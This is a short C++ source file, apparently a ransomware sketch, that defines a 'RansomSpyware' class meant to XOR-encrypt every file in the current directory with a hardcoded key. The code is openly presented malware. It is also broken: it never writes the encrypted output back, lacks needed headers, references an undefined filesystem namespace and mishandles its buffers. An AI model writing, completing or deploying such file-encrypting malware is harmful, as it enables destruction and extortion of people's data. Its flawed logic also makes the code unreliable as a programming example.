#include <iostream>
#include <fstream>
#include <string>

#define ENCRYPT_KEY "1234567890"

class RansomSpyware {
public:
    void encryptData(std::string file) {
        std::ifstream inputFile(file);
        if (!inputFile.is_open()) {
            std::cerr << "Error opening the file." << std::endl;
            return;
        }
        char buffer[1024];
        while (inputFile.read(buffer, sizeof(buffer))) {
            encrypt(buffer);
        }
        inputFile.close();
    }

private:
    void encrypt(char *data) {
        for (int i = 0; data[i]; ++i) {
            data[i] ^= ENCRYPT_KEY[i % strlen(ENCRYPT_KEY)];
        }
    }
};

int main() {
    RansomSpyware ransomSpyware;
    
    // Example: Encrypting files in the current directory
    char currentDirectory[1024];
    if (getcwd(currentDirectory, sizeof(currentDirectory)) != NULL) {
        std::cout << "Current working dir : " << currentDirectory << std::endl;
        
        for (const auto & entry : fs::directory_iterator(currentDirectory)) {
            ransomSpyware.encryptData(entry.path().string());
        }
    } else {
        std::cerr << "Failed to get current directory" << std::endl;
    }

    return 0;
}
